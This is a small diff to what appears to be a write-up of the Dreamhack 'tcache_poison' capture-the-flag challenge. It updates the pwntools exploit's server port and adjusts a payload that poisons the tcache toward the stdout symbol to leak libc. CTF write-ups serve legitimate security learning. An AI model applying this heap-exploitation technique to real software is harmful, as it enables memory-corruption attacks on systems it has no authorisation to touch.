@@ -423,7 +423,7 @@ p.interactive()
 ```
 from pwn import *
 
-p = remote('host3.dreamhack.games', 24385)
+p = remote('host3.dreamhack.games', 16758)
 elf = ELF('./tcache_poison')
 libc = ELF('./libc-2.27.so')
 
@@ -460,7 +460,7 @@ free()  # (1)
 # tcache[0x40] : first(1) -> stdout -> _IO_2_1_stdout_
 # chunk : first(1)
 stdout = elf.symbols['stdout']
-edit(p64(stdout) + b'a')
+edit(p64(stdout))
 
 
 # tcache[0x40] : stdout -> _IO_2_1_stdout_
